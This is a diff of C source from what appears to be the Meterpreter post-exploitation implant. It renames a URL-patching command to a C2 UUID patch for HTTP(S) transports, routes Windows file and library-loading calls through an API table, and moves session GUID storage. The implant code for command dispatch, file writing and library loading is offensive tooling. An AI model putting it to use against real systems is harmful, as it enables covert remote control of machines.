@@ -22,7 +22,7 @@ DWORD request_core_machine_id(Remote* remote, Packet* packet);
 DWORD request_core_get_session_guid(Remote* remote, Packet* packet);
 DWORD request_core_set_session_guid(Remote* remote, Packet* packet);
 DWORD request_core_set_uuid(Remote* remote, Packet* packet);
-BOOL request_core_patch_url(Remote* remote, Packet* packet, DWORD* result);
+BOOL request_core_patch_uuid(Remote* remote, Packet* packet, DWORD* result);
 
 // Dispatch table
 Command customCommands[] =
@@ -35,7 +35,7 @@ Command customCommands[] =
 	COMMAND_REQ(COMMAND_ID_CORE_SET_UUID, request_core_set_uuid),
 	COMMAND_REQ(COMMAND_ID_CORE_PIVOT_ADD, request_core_pivot_add),
 	COMMAND_REQ(COMMAND_ID_CORE_PIVOT_REMOVE, request_core_pivot_remove),
-	COMMAND_INLINE_REP(COMMAND_ID_CORE_PATCH_URL, request_core_patch_url),
+	COMMAND_INLINE_REP(COMMAND_ID_CORE_PATCH_UUID, request_core_patch_uuid),
 	COMMAND_TERMINATOR
 };
 
@@ -58,7 +58,7 @@ DWORD buffer_to_file(LPCSTR filePath, PUCHAR buffer, ULONG length)
 	do
 	{
 		// Try to open the file for writing
-		if ((h = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_NEW,
+		if ((h = met_api->win_api.kernel32.CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_NEW,
 				FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
 		{
 			res = GetLastError();
@@ -69,7 +69,7 @@ DWORD buffer_to_file(LPCSTR filePath, PUCHAR buffer, ULONG length)
 
 		// Keep writing until everything is written
 		while ((bytesLeft) &&
-			   (WriteFile(h, buffer + offset, bytesLeft, &bytesWritten, NULL)))
+			   (met_api->win_api.kernel32.WriteFile(h, buffer + offset, bytesLeft, &bytesWritten, NULL)))
 		{
 			bytesLeft -= bytesWritten;
 			offset    += bytesWritten;
@@ -80,7 +80,7 @@ DWORD buffer_to_file(LPCSTR filePath, PUCHAR buffer, ULONG length)
 	} while (0);
 
 	if (h != INVALID_HANDLE_VALUE)
-		CloseHandle(h);
+		met_api->win_api.kernel32.CloseHandle(h);
 
 	return res;
 }
@@ -106,21 +106,19 @@ BOOL ext_cmd_callback(LPVOID pState, LPVOID pData)
 	return FALSE;
 }
 
-BOOL request_core_patch_url(Remote* remote, Packet* packet, DWORD* result)
+BOOL request_core_patch_uuid(Remote* remote, Packet* packet, DWORD* result)
 {
 	// this is a special case because we don't actually send
 	// response to this. This is a brutal switch without any
 	// other forms of comms, and this is because of stageless
 	// payloads
-	if (remote->transport->type == METERPRETER_TRANSPORT_TCP)
-	{
-		// This shouldn't happen.
-		*result = ERROR_INVALID_STATE;
-	}
-	else
+	*result = ERROR_INVALID_STATE;
+	if (remote->transport->type == METERPRETER_TRANSPORT_HTTPS || remote->transport->type == METERPRETER_TRANSPORT_HTTP)
 	{
 		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
-		ctx->new_uri = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);
+		SAFE_FREE(ctx->uuid);
+		ctx->uuid = packet_get_tlv_value_wstring(packet, TLV_TYPE_C2_UUID);
+		dprintf("[PATCH UUID] New UUID is %S", ctx->uuid);
 		*result = ERROR_SUCCESS;
 	}
 	return TRUE;
@@ -417,7 +415,7 @@ DWORD request_core_loadlib(Remote *remote, Packet *packet)
 		}
 
 		// Load the library
-		if (!library && !(library = LoadLibraryA(libraryPath)))
+		if (!library && !(library = met_api->win_api.kernel32.LoadLibraryA(libraryPath)))
 		{
 			res = GetLastError();
 		}
@@ -461,7 +459,7 @@ DWORD request_core_set_uuid(Remote* remote, Packet* packet)
 
 	if (newUuid != NULL)
 	{
-		memcpy(remote->orig_config->session.uuid, newUuid, UUID_SIZE);
+		memcpy(remote->uuid, newUuid, UUID_SIZE);
 	}
 
 	if (response)
@@ -483,7 +481,7 @@ DWORD request_core_get_session_guid(Remote* remote, Packet* packet)
 	Packet* response = packet_create_response(packet);
 	if (response)
 	{
-		packet_add_tlv_raw(response, TLV_TYPE_SESSION_GUID, &remote->orig_config->session.session_guid, sizeof(GUID));
+		packet_add_tlv_raw(response, TLV_TYPE_SESSION_GUID, remote->session_guid, sizeof(remote->session_guid));
 		packet_transmit_response(ERROR_SUCCESS, remote, response);
 	}
 	return ERROR_SUCCESS;
@@ -503,7 +501,7 @@ DWORD request_core_set_session_guid(Remote* remote, Packet* packet)
 
 	if (sessionGuid != NULL)
 	{
-		memcpy(remote->orig_config->session.session_guid, sessionGuid, sizeof(GUID));
+		memcpy(remote->session_guid, sessionGuid, sizeof(GUID));
 	}
 	else
 	{
